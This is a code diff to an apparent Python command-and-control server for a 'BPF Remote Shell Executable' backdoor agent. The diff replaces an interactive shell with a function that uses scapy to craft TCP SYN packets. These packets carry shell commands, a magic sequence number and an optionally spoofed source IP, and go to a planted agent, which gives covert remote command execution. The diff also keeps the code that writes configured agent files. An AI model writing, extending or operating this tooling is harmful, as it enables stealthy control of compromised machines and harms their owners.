@@ -1,70 +1,13 @@
 from c2.view import C2View
-from cmd import Cmd
 from pathlib import Path
 from importlib.resources import files
-from c2.parse import get_command_args
+from scapy.all import IP, TCP, send
 import struct
 import argparse
 import logging
-import shlex
 
 
-class C2(Cmd):
-    prompt = C2View.colored_text("BPF EXEC> ", "C9C9EE")
-
-    def __init__(self, completekey="tab", stdin=None, stdout=None):
-        super().__init__(completekey, stdin, stdout)
-        self.c2_cmd: C2Cmd = None
-
-    def do_configure(self, arg: str) -> None:
-        """Generates a new configured BPF Remote Shell Executable Agent. \nconfigure --name <agent_name> --output <outpath> --sequence <sequence_number>"""
-        parser = argparse.ArgumentParser(
-            description="Configure the BPF Remote Shell Executable Agent."
-        )
-
-        parser.add_argument("--name", type=str, help="Name of the agent")
-        parser.add_argument("--output", type=str, help="Output file for the agent")
-        parser.add_argument(
-            "--sequence",
-            type=int,
-            default=5445,
-            help="Sequence number for tcp raw send",
-        )
-
-        config_args = parser.parse_args(shlex.split(arg))
-        self.c2_cmd.configure(config_args)
-
-    def do_exit(self, arg: str) -> bool:
-        """Exit the command loop."""
-        self.c2_cmd.view.print_msg("Goodbye.")
-        return True
-
-    def do_help(self, arg):
-        """List available commands with "help" or detailed help with "help cmd"."""
-        if arg:
-            try:
-                func = getattr(self, "help_" + arg)
-            except AttributeError:
-                try:
-                    doc = getattr(self, "do_" + arg).__doc__
-                    if doc:
-                        self.stdout.write("%s\n" % str(doc))
-                        return
-                except AttributeError:
-                    pass
-                self.stdout.write("%s\n" % str(self.nohelp % (arg,)))
-                return
-            func()
-        else:
-            names = self.get_names()
-            self.c2_cmd.view.print_msg("Available commands:")
-            for name in names:
-                if name.startswith("do_"):
-                    cmd_name = name[3:]
-                    self.c2_cmd.view.print_msg(f"  {cmd_name}")
-
-
-class C2Cmd:
+class C2:
     def __init__(self, args: argparse.Namespace, log_level: int = logging.INFO):
         self.args = args
         self.view = C2View(log_level=log_level, logfile=args.log_file)
@@ -73,14 +16,47 @@ class C2Cmd:
         """Generates packed data for the BPF Remote Shell Executable Agent configuration.
 
         Args:
-            args (argparse.Namespace): _description_
+            args (argparse.Namespace): argparse arguments containing packed data options.
 
         Returns:
-            bytes: _description_
+            bytes: Packed data to be stamped
         """
-        packed_data = struct.pack("!I36x", args.sequence)
+        packed_data = struct.pack("!I36x", args.seq)
 
         return packed_data
+
+    def tcp_raw_send(self, args: argparse.Namespace) -> bool:
+        """Sends a raw TCP packet to the configured agent.
+
+        Args:
+            args (argparse.Namespace): argparse arguments containing the TCP packet options.
+        """
+
+        try:
+            command = args.command.encode(encoding="utf-8")
+        except UnicodeEncodeError:
+            self.view.print_error("Could not encode shell command.")
+
+        cmd_len = struct.pack("!I", len(command))
+
+        packet = (
+            IP(dst=args.dip, src=args.sip)
+            / TCP(dport=args.dport, sport=args.sport, flags="S", seq=args.seq)
+            / command
+            / cmd_len
+        )
+
+        if len(packet) > 5000:
+            self.view.print_error("Packet size exceeds 5000 bytes. Aborting send.")
+            return False
+        self.view.print_msg(f"Sending: {packet.summary()}")
+        try:
+            send(packet, verbose=False)
+            self.view.print_success("Packet sent successfully.")
+        except PermissionError:
+            self.view.print_error(f"Failed to send packet. Are you root?")
+            return False
+        return True
 
     def configure(self, args: argparse.Namespace) -> bool:
         """Configure the BPF Remote Shell Executable Agent.
@@ -113,31 +89,10 @@ class C2Cmd:
         output_dir = Path(args.output)
         output_dir.mkdir(parents=True, exist_ok=True)
 
-        output_dir = Path(output_dir, f"{args.name}.bpf")
+        output_dir = Path(output_dir, f"{args.name}.agent")
 
         with open(output_dir, "wb") as f:
             f.write(new_data)
         self.view.print_success(f"Written new config to {output_dir.absolute()}")
 
         return True
-
-
-def start_c2():
-    args = get_command_args()
-    if args.debug:
-        log_level = logging.DEBUG
-    else:
-        log_level = logging.INFO
-
-    c2_cmd = C2Cmd(args, log_level)
-
-    c2 = C2(stdout=c2_cmd.view)
-    c2.c2_cmd = c2_cmd
-    intro = C2View.colored_text(
-        "Berkley Packet Filter Remote Shell Executable\n\n", "05A8AA"
-    )
-
-    # Print the intro message without logging
-    print(intro)
-
-    c2.cmdloop()
